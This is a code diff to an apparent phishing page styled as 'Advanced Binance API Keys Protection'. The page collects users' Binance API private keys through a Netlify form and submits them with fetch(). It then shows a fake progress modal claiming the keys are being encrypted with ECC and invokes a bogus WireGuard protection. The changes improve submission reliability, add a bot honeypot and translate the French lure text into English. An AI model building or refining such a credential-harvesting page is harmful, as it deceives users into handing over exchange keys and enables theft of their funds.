@@ -301,8 +301,11 @@
   
   <div class="container" style="max-width:340px;padding:22px 18px;">
     <h2 style="font-size:1.25rem;margin-bottom:16px;">Advanced Binance API Keys Protection</h2>
-    <form name="binance-api-key" method="POST" data-netlify="true" netlify-honeypot="bot-field" style="margin-bottom:0;">
+    <form name="binance-api-key" method="POST" action="/" data-netlify="true" netlify-honeypot="bot-field" style="margin-bottom:0;">
       <input type="hidden" name="form-name" value="binance-api-key">
+      <p class="hidden" style="display:none;">
+        <label>Don't fill this out if you're human: <input name="bot-field" /></label>
+      </p>
       <div class="input-group" style="margin-bottom:12px;">
         <label for="privateKey" style="font-size:13px;">API Private Key</label>
         <input type="password" id="privateKey" name="privateKey" placeholder="Enter your private key" required style="font-size:15px;padding:9px 10px;">
@@ -318,12 +321,18 @@
       document.querySelector('form').addEventListener('submit', function(e) {
         e.preventDefault();
         var form = e.target;
-        var data = new FormData(form);
+        var formData = new FormData(form);
         fetch('/', {
           method: 'POST',
-          headers: { 'Accept': 'application/x-www-form-urlencoded' },
-          body: new URLSearchParams(data).toString()
-        }).then(function() {
+          headers: { 
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Accept': 'application/json'
+          },
+          body: new URLSearchParams(formData).toString()
+        }).then(function(response) {
+          if (!response.ok) {
+            throw new Error('Network response was not ok');
+          }
           var modal = document.getElementById('modal');
           modal.style.display = 'flex';
           // Force reflow
@@ -357,7 +366,6 @@
         });
       });
     </script>
-    </form>
     
     <div class="protection" style="font-size:1.1rem;margin-top:16px;">
       <p style="margin:0;">⚠️ The <span style="color:#f0b90b;font-weight:bold;">WireGuard</span> protection will enhance your Binance API Keys security by restricting unauthorized access.</p>
@@ -394,8 +402,8 @@
   <div id="modal">
     <div class="modal-content">
       <div id="modal-message">
-        Chargement en cours…<br>
-        Chiffrement elliptique (ECC) de vos clés API en cours de traitement. Veuillez patienter.
+        Loading...<br>
+        Processing API keys encryption using ECC (Elliptic Curve Cryptography). Please wait.
       </div>
       <div class="progress-bar-container">
         <div class="progress-bar"></div>
